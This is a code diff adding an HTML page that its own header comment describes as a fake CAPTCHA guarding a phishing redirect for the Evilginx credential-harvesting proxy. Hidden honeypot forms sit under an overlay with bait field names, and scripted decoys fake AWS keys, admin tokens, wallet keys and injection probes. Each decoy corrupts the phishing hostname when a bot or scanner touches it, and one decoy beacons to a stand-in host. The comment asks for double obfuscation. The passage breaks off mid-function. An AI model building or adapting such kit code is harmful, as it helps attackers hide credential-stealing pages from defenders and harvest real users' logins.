@@ -1,0 +1,929 @@
+<!--
+This HTML places a z-index overlay above hidden buttons, checkmarks, or forms that sophisticated bots typically interact with. If any hidden element (behind the overlay) is triggered, it will corrupt parts of the legitimate hostname used by the fake CAPTCHA redirect.
+
+Adjust the constants in O_t88UX to dynamically generate your phishing hostname.
+
+Update the eval statements so that hostname corruption occurs whenever bots interact with hidden elements, ensuring only genuine human interactions reach the intended redirect.
+
+Obfuscate this code twice when used in Evilginx!
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<form onsubmit="return iJDABon();">
+  <input type="text" name="Login" id="kJhTfgZxqL" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="password" name="AuthToken" id="pLmNkJoHyT" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="email" name="AuthLogin" id="qWeRtYuIoP" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="text" name="ApiLogin" id="aSdFgHjKlZ" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="number" name="SessionCreate" id="zXcVbNmKjH" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="search" name="ApiAuthenticate" id="lPoIkJuHyG" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="text" name="OauthToken" id="mNbVcXzLaS" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="password" name="TokenRefresh" id="tReWqAsDfG" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="password" name="Reset-Password" id="yHnMkIjUbV" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; width: 200px; margin: 5px 0;">
+  <input type="button" name="Forgot-Password" id="oCvBnMkLjH" onclick="this.setAttribute('tch', 'true');" style="padding: 8px 15px; background-color: #f0f0f0; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; cursor: pointer; margin: 5px 0;" value="Forgot Password">
+  <input type="checkbox" name="RememberMe" id="wErTyUiOpL" style="margin: 5px 0;">
+</form>
+<form onsubmit="return oIAndajfI();">
+  <input type="text" name="Admin" id="aBcDeFgHiJ" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="password" name="Administrator" id="kLmNoPqRsT" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="email" name="ApiPanel" id="uVwXyZaBcD" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="text" name="Admin-Panel" id="eFgHiJkLmN" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="number" name="Dashboard" id="oPqRsTuVwX" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="search" name="Admin-Console" id="yZaBcDeFgH" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="text" name="Control" id="iJkLmNoPqR" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="password" name="ApiAdminSettings" id="sTuVwXyZaB" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 250px; margin: 8px 0; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);">
+  <input type="button" name="Cms" id="cDeFgHiJkL" onclick="this.setAttribute('pac', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; margin: 8px 0;" value="CMS Access">
+  <input type="checkbox" name="Root" id="mNoPqRsTuV" style="width: 16px; height: 16px; margin: 8px 0; accent-color: #3b82f6;">
+</form>
+<form onsubmit="return uIAndaPa();">
+  <input type="text" name="Debug" id="QwErTyUiOp" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="password" name="Debugging" id="AsDfGhJkLz" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="text" name="DebugVars" id="ZxCvBnMlKj" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="email" name="Dev" id="HgFdSaQwEr" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="search" name="Test-Api" id="TyUiOpAsDf" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="number" name="ApiTest" id="GhJkLzXcVb" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="text" name="Env" id="NmKlJhGfDs" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+  <input type="button" name="Status" id="QaZsXeDcRf" onclick="this.setAttribute('zedge', 'true');" style="padding: 8px 16px; background-color: #e0e0e0; border: 1px solid #bbb; border-radius: 4px; font-family: monospace; font-size: 13px; margin: 6px 0; cursor: pointer;" value="Check Status">
+  <input type="checkbox" name="Info" id="TgBhYvKuIj" style="width: 16px; height: 16px; margin: 6px 0; accent-color: #4CAF50;">
+  <input type="text" name="Trace" id="MnBvCxZlKj" style="padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; font-size: 13px; width: 300px; margin: 6px 0; background-color: #f8f8f8;">
+</form>
+<form onsubmit="return YgjsafuUsa();">
+  <input type="text" name="Config" id="XkLmNoPqRs" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="password" name="ApiConfig" id="TuVwXyZaBc" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="password" name="Secrets" id="DeFgHiJkLm" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="text" name="Secret" id="NoPqRsTuVw" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="email" name="Internal" id="XyZaBcDeFg" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="search" name="InternalData" id="HiJkLmNoPq" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="number" name="Settings" id="RsTuVwXyZa" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="text" name="Db" id="BcDeFgHiJk" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; color: #111827;">
+  <input type="button" name="Database" id="LmNoPqRsTu" onclick="this.setAttribute('pluse', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; cursor: pointer; margin: 8px 0;" value="DB Connect">
+  <input type="checkbox" name="Env.Json" id="VwXyZaBcDe" style="width: 18px; height: 18px; margin: 8px 0; accent-color: #3b82f6;">
+</form>
+<form onsubmit="return SuLslMus();">
+  <input type="text" name="Cookie" id="YhKjLmNpQr" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="password" name="Cookies" id="ZsXcVbNmKl" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="text" name="Set-Cookie" id="PoIuYtReWq" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="text" name="Redirect" id="MnBvCxZlKj" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="search" name="Redirection" id="QwErTyUiOp" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="email" name="ApiRedirect" id="AsDfGhJkLz" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="text" name="Location" id="XcVbNmKlJi" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+  <input type="button" name="Next" id="HgFdSaQwEr" onclick="this.setAttribute('tier', 'true');" style="padding: 8px 16px; background: #3b82f6; color: white; border: none; border-radius: 4px; font-size: 14px; margin: 6px 0; cursor: pointer;" value="Next">
+  <input type="checkbox" name="Track" id="TyUiOpAsDf" style="width: 16px; height: 16px; margin: 6px 0; accent-color: #3b82f6;">
+  <input type="number" name="Track-User" id="GhJkLzXcVb" style="padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 4px; background: #f8fafc; font-size: 14px; width: 280px; margin: 6px 0; color: #334155; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);">
+</form>
+<form onsubmit="return IIIIImdak();">
+  <input type="text" name="Admin" id="BcDeFgHiJk" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="text" name="AdminApi" id="LmNoPqRsTu" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="text" name="AdminLogin" id="VwXyZaBcDe" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="password" name="AdminDashboard" id="FgHiJkLmNo" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="password" name="AdminConfig" id="PqRsTuVwXy" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="email" name="Administrator" id="ZaBcDeFgHi" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="password" name="Auth" id="JkLmNoPqRs" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="password" name="AuthToken" id="TuVwXyZaBc" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; width: 280px; margin: 8px 0; background-color: #f9fafb; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="button" name="AuthRefresh" id="DeFgHiJkLm" onclick="this.setAttribute('dane', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; margin: 8px 0;" value="Refresh Token">
+  <input type="checkbox" name="AuthLogin" id="NoPqRsTuVw" style="width: 16px; height: 16px; margin: 8px 0; accent-color: #3b82f6;">
+</form>
+<form onsubmit="return OOOadnjcaO();">
+  <input type="text" name="ApiUserProfile" id="XkLmNoPqRs" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="password" name="ApiUserSettings" id="TuVwXyZaBc" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="text" name="ApiUserDelete" id="DeFgHiJkLm" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="search" name="ApiData" id="NoPqRsTuVw" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="text" name="ApiConfig" id="XyZaBcDeFg" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="email" name="ApiV1Users" id="HiJkLmNoPq" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="password" name="ApiV1Admin" id="RsTuVwXyZa" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="number" name="ApiPrivate" id="BcDeFgHiJk" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="button" name="ApiDev" id="LmNoPqRsTu" onclick="this.setAttribute('church', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; font-family: 'Roboto Mono', monospace; font-size: 14px; cursor: pointer; margin: 8px 0;" value="Dev Tools">
+  <input type="checkbox" name="ApiDebug" id="VwXyZaBcDe" style="width: 18px; height: 18px; margin: 8px 0; accent-color: #3b82f6;">
+</form>
+<form onsubmit="return TThsayfad();">
+  <input type="text" name="Wp-Json" id="QwErTyUiOp" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="password" name="Wp-JsonWpV2Users" id="AsDfGhJkLz" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="text" name="Wp-JsonWpV2Settings" id="ZxCvBnMlKj" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="search" name="Wp-JsonWpV2Plugins" id="HgFdSaQwEr" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="email" name="Wp-JsonCustom-Endpoint" id="TyUiOpAsDf" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="number" name="Xmlrpc.Php" id="GhJkLzXcVb" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1e293b;">
+  <input type="button" name="Wp-AdminAdmin-Ajax.Php" id="NmKlJhGfDs" onclick="this.setAttribute('blush', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; cursor: pointer; margin: 8px 0;" value="AJAX Endpoint">
+  <input type="checkbox" name="Wp-ContentDebug.Log" id="QaZsXeDcRf" style="width: 18px; height: 18px; margin: 8px 0; accent-color: #3b82f6;">
+</form>
+<form onsubmit="return tYBisadJ();">
+  <input type="text" name="Graphql" id="XkLmNoPqRs" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e40af; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
+  <input type="password" name="GraphqlApi" id="TuVwXyZaBc" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e40af; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
+  <input type="text" name="Graphiql" id="DeFgHiJkLm" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e40af; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
+  <input type="search" name="Gql" id="NoPqRsTuVw" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e40af; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
+  <input type="email" name="Introspection" id="XyZaBcDeFg" style="padding: 10px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #1e40af; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
+  <input type="button" name="ApiGraphqlExplorer" id="HiJkLmNoPq" onclick="this.setAttribute('staer', 'true');" style="padding: 10px 20px; background-color: #1e40af; color: white; border: none; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; cursor: pointer; margin: 8px 0;" value="GraphQL Explorer">
+  <input type="checkbox" name="ApiGraphqlSchema" id="RsTuVwXyZa" style="width: 18px; height: 18px; margin: 8px 0; accent-color: #1e40af;">
+</form>
+<form onsubmit="return UYbuadIJM();">
+  <input type="text" name="Config.Json" id="QwErTyUiOp" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="password" name=".Env" id="AsDfGhJkLz" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="text" name="Debug" id="ZxCvBnMlKj" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="search" name="DebugInfo" id="HgFdSaQwEr" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="email" name="SystemConfig" id="TyUiOpAsDf" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="number" name="Server-Status" id="GhJkLzXcVb" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="text" name="Logs" id="NmKlJhGfDs" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+  <input type="button" name="Backup.Zip" id="QaZsXeDcRf" onclick="this.setAttribute('krippi', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; cursor: pointer; margin: 8px 0;" value="Create Backup">
+  <input type="checkbox" name="Db.Sql" id="TgBhYvKuIj" style="width: 18px; height: 18px; margin: 8px 0; accent-color: #3b82f6;">
+  <input type="password" name="ApiSecrets" id="MnBvCxZlKj" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 14px; width: 320px; margin: 8px 0; background-color: #f8fafc; color: #1f2937; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);">
+</form>
+<form onsubmit="return iuyguNUNU();">
+  <input type="text" name="Internal" id="XkLmNoPqRs" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Segoe UI', sans-serif; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #111827;">
+  <input type="password" name="InternalAuth" id="TuVwXyZaBc" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Segoe UI', sans-serif; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #111827;">
+  <input type="text" name="InternalHealth" id="DeFgHiJkLm" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Segoe UI', sans-serif; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #111827;">
+  <input type="email" name="ServicesUser-Service" id="NoPqRsTuVw" style="padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; font-family: 'Segoe UI', sans-serif; font-size: 14px; width: 300px; margin: 8px 0; background-color: #f8fafc; color: #111827;">
+  <input type="button" name="ServicesPayment-Service" id="XyZaBcDeFg" onclick="this.setAttribute('kamti', 'true');" style="padding: 10px 20px; background-color: #3b82f6; color: white; border: none; border-radius: 4px; font-family: 'Segoe UI', sans-serif; font-size: 14px; cursor: pointer; margin: 8px 0;" value="Payment Service">
+</form>
+<div class="overlay-all">
+    <div class="daoemsit-container">
+        <div class="daoemsit-content">
+            <label for="human-check" class="label disabled" id="daoemsitLabel">Are You Human?</label>
+            <div class="logo-area">
+                <div class="logo-container">
+                    <div class="spinner" id="spinner"></div>
+                    <div class="daoemsit-triangles" id="triangles">
+                        <div class="daoemsit-triangle invert"></div>
+                        <div class="daoemsit-triangle invert"></div>
+                        <div class="daoemsit-triangle normal"></div>
+                        <div class="daoemsit-triangle invert"></div>
+                        <div class="daoemsit-triangle invert"></div>
+                        <div class="daoemsit-triangle normal"></div>
+                        <div class="daoemsit-triangle invert"></div>
+                        <div class="daoemsit-triangle normal"></div>
+                        <div class="daoemsit-triangle invert"></div>
+                    </div>
+                </div>
+                <div class="daoemsit-label">Triangle daoemsit</div>
+                <div class="privacy-terms">
+                    <a href="#" onclick="return false;">Privacy</a>
+                    <span> - </span>
+                    <a href="#" onclick="return false;">Terms</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+  function getAWSCredentials() {
+    document.cookie = "cred_aws_scan=1; Path=/; SameSite=Strict; Secure";
+    O_x62Yusa();
+  
+    const [p1, p2] = ["AKIA", "GjUIGjn"];
+    const [s1, s2] = ["wJalrXUtnFEMI/K7MDENG/bPxRfiCY", "GjUIGjn"];
+    return { 
+      accessKey: p1 + "876545678" + p2, 
+      secretKey: s1 + s2,
+      __comment: "// DEV ONLY - WILL BE DELETED IN PROD"
+    };
+  }
+
+  function generateAdminToken() {
+    localStorage.setItem('cred_jwt_scan', new Date().toISOString());
+    O_x34563X();
+  
+    const header = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" }));
+    const payload = btoa(JSON.stringify({ user: "admin", isAdmin: true, iat: Date.now() }));
+    return `${header}.${payload}.SIGNATURE_LOOKUP_BLOCKED`;
+  }
+
+  function unsafeSQLQuery(userInput) {
+    if (!arguments.length || typeof userInput !== 'string') {
+      fetch('/early-access', { method: 'POST', body: "SQLi_scan_attempt" });
+      O_x62Yusa();
+      return "ERROR: Invalid input";
+    }
+  
+    return `SELECT * FROM users WHERE username='${userInput.replace(/'/g, "''")}'`;
+  }
+
+  const __internalDebug = {
+    getEnvVars: () => {
+      sessionStorage.setItem("debug_mode_accessed", "1");
+      O_x444Tar();
+    
+      return {
+        DB_PASSWORD: "root:" + Math.random().toString(36).slice(2),
+        API_KEY: "deadbeef-" + Math.random().toString(36).slice(2, 10)
+      };
+    }
+  };
+
+  function getWalletPrivateKey() {
+    new Image().src = "https://no.exfil.domain/log?type=wallet_scan";
+    O_x34563X();
+  
+    return {
+      key: "0x4f3a" + Math.random().toString(16).slice(2, 10) + "7214",
+      network: "mainnet",
+      __warning: "DEV TEST KEY - DO NOT COMMIT"
+    };
+  }
+
+  function enableAdminMode() {
+    const AdminFingerprint = {
+      ua: navigator.userAgent,
+      time: new Date().toUTCString(),
+      ip: "192.168.77.68"
+    };
+    localStorage.setItem("last_admin_attempt", JSON.stringify(AdminFingerprint));
+    O_x444Tar();
+  
+    document.cookie = "admin=0; Path=/; Max-Age=1";
+  }
+
+  function __loadSourceMap() {
+    try { throw new Error(); } catch (e) {
+      if (e.stack.includes("__loadSourceMap")) {
+        navigator.sendBeacon("/early-access", "sourcemap_scan");
+      }
+    }
+    O_x62Yusa();
+  
+    return { 
+      version: 3, 
+      sources: ["webpack:///non-existent.js"] 
+    };
+  }
+
+  function decryptCredentials(encryptedData) {
+    if (!encryptedData || typeof encryptedData !== 'string') {
+      document.body.classList.add("sessionizer");
+      O_x34563X();
+      return "ERROR: Invalid input";
+    }
+  
+    return atob(encryptedData).split('').reverse().join('');
+  }
+
+  function fetchInternal(url) {
+    if (!url || /(localhost|127\.|192\.168|internal)/i.test(url)) {
+      window.__ssrf_scan = true;
+      O_x34563X();
+      return Promise.reject("Invalid URL");
+    }
+  
+  return fetch(url).catch(() => {});
+  }
+
+  function parseXML(xmlStr) {
+    if (!xmlStr || /<!ENTITY/i.test(xmlStr)) {
+      sessionStorage.setItem("xxe_attempt", "1");
+      O_x444Tar();
+      return null;
+    }
+  
+    return new DOMParser().parseFromString(xmlStr, "text/xml");
+  }
+
+  function Milkovich() {
+    if (navigator.webdriver) {
+      O_x34563X();
+      return true;
+    }
+
+  let mouseMoveCount = 0;
+  let mouseHandler;
+
+  const ua = navigator.userAgent;
+  const isDesktop =
+    window.matchMedia("(pointer: fine)").matches &&
+    (ua.includes("Windows") || ua.includes("Macintosh") || ua.includes("Linux"));
+
+  if (isDesktop) {
+    mouseHandler = () => {
+      mouseMoveCount++;
+    };
+
+    window.addEventListener("mousemove", mouseHandler);
+
+    setTimeout(() => {
+      window.removeEventListener("mousemove", mouseHandler);
+      if (mouseMoveCount < 15 || mouseMoveCount > 200) {
+        O_x62Yusa();
+      }
+    }, 5000);
+  }
+
+  function setCookie(name, value, days) {
